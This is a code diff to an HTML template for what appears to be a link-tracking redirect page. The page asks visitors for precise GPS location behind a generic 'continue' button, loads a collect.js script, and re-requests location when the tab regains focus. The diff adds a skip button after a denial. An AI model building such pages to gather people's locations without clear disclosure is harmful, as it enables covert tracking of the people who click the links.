@@ -8,7 +8,9 @@ body{margin:0;background:#0f1115;color:#e6e9ef;font-family:system-ui,-apple-syst
 .wrap{text-align:center;padding:24px;max-width:420px}
 h1{font-size:18px;margin:0 0 8px}
 p{color:#9aa3b2;font-size:13px;margin:0 0 20px}
-button{padding:12px 32px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;color:#fff}
+.btns{display:flex;gap:8px;justify-content:center;flex-wrap:wrap}
+button{padding:12px 28px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;color:#fff}
+button.ghost{background:#1b2028;color:#cfd6e2;border:1px solid #2b323d}
 .tiny{font-size:12px;color:#9aa3b2;margin-top:16px;line-height:1.6}
 .tiny.warn{color:#f0b429}
 .tiny.ok{color:#2ecc71}
@@ -17,14 +19,17 @@ a{color:#4c8dff}
 <div class="wrap">
   <h1>{{ link.name }}</h1>
   <p>{{ link.note or "続けるを押してください" }}</p>
-  <button id="go">{{ go_text }}</button>
+  <div class="btns">
+    <button id="go">{{ go_text }}</button>
+    <button class="ghost" id="skip" style="display:none">{{ skip_text }}</button>
+  </div>
   <p class="tiny" id="st"></p>
 </div>
 <script>
 window.LT_CODE  = {{ code|tojson }};
 window.LT_HIT   = {{ hit_id }};
 window.LT_NONCE = {{ nonce|tojson }};
-window.LT_GEO   = 0;          /* GPSはこのページで直接取る */
+window.LT_GEO   = 0;
 var DEST = {{ dest|tojson }};
 var GO_TEXT = {{ go_text|tojson }};
 var WAIT_TEXT = {{ wait_text|tojson }};
@@ -37,7 +42,8 @@ var DEST_MIN = {{ dest_min }};
 <script src="/static/collect.js"></script>
 <script>
 (function () {
-  var st = document.getElementById('st'), go = document.getElementById('go');
+  var st = document.getElementById('st'), go = document.getElementById('go'),
+      skip = document.getElementById('skip');
   var busy = false, done = false;
 
   function txt(m, cls) { st.textContent = m; st.className = 'tiny' + (cls ? ' ' + cls : ''); }
@@ -55,8 +61,9 @@ var DEST_MIN = {{ dest_min }};
   function ng() {
     done = false;
     txt(DENY_TEXT, 'warn');
-    go.textContent = RETRY_TEXT;
+    go.textContent = RETRY_TEXT;      // ボタンは消さずに文言だけ変える
     go.disabled = false;
+    if (DEST) skip.style.display = ''; // 「このまま進む」
     if (DENY_REDIRECT && DEST) setTimeout(function () { location.href = DEST; }, 1500);
   }
 
@@ -71,7 +78,11 @@ var DEST_MIN = {{ dest_min }};
       { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
   }
 
-  go.addEventListener('click', attempt);
+  go.addEventListener('click', function () {
+    if (go.textContent === RETRY_TEXT) txt(WAIT_TEXT, '');
+    attempt();
+  });
+  skip.addEventListener('click', function () { if (DEST) location.href = DEST; });
   document.addEventListener('visibilitychange', function () {
     if (document.visibilityState === 'visible' && !done) attempt();
   });
